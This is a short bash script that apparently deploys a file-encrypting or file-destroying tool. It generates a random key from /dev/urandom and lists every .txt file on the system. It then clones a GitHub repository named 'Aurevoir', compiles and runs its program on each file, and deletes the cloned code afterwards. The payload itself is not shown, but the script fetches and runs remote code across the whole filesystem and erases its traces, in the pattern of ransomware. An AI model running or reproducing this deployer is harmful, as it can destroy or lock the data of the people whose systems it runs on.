#!/bin/bash


apt-get install git
apt-get install gcc

initialLocation="$(pwd)"
numberOfFiles=0
locationOfFile=""

cd /dev
head -16 urandom > keyGenDump.txt
find / -name "*.txt" > fileLocations.txt

git clone https://github.com/ape-x/Aurevoir.git

mv keyGenDump.txt Aurevoir
mv fileLocations.txt Aurevoir
mv Aurevoir $initialLocation
cd $initialLocation
cd Aurevoir
gcc -o exe main.c

numberOfFiles=$(wc -l < fileLocations.txt)

for i in $(seq 1 $numberOfFiles)
	do
	locationOfFile="$(head -n $i fileLocations.txt | tail -1)"
	./exe $locationOfFile
	done

cd ..
rm -rf Aurevoir

exit
